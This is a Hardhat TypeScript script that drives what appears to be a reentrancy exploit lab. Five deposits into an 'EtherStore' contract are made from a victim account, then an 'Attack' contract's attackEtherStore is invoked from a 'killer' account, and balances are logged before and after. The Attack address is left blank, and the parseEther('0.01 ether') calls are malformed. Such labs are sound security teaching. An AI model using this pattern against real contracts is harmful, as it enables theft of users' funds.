import { ethers } from "hardhat";

async function main() {
  const [deployer, hogu, killer] = await ethers.getSigners();
  console.log("Deploying contracts with the account:", deployer.address);
  console.log(
    "Account balance:",
    ethers.utils.formatEther(await deployer.getBalance()),
    "ETH"
  );

  // We get the contract to deploy
  const etherStoreCA = "0x30c54Ece1bCc168d7B5efFb8d7039AF85D4e286a";
  const EtherStore = await ethers.getContractFactory("EtherStore");
  const etherStore = await EtherStore.attach(etherStoreCA);

  const attackCA = "";
  const Attack = await ethers.getContractFactory("Attack");
  const attacker = await Attack.attach(attackCA);

  for (let idx = 0; idx < 5; idx++) {
    console.log(
      "Balance of hogu is ",
      ethers.utils.formatEther(await hogu.getBalance())
    );
    const txs = [];
    const tx = await etherStore
      .connect(hogu)
      .depositFunds({ value: ethers.utils.parseEther("0.01 ether") });
    txs.push(tx);
    console.log("hogu deposited 0.01 ether to Bank");
    console.log(
      "Balance of hogu is ",
      ethers.utils.formatEther(await hogu.getBalance())
    );
  }

  console.log(
    "Balance of killer is ",
    ethers.utils.formatEther(await killer.getBalance())
  );
  const tx = await attacker
    .connect(killer)
    .attackEtherStore({ value: ethers.utils.parseEther("0.01 ether") });
  const receipt = await tx.wait();
  console.log(receipt);
  console.log(
    "Balance of killer is ",
    ethers.utils.formatEther(await killer.getBalance())
  );
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
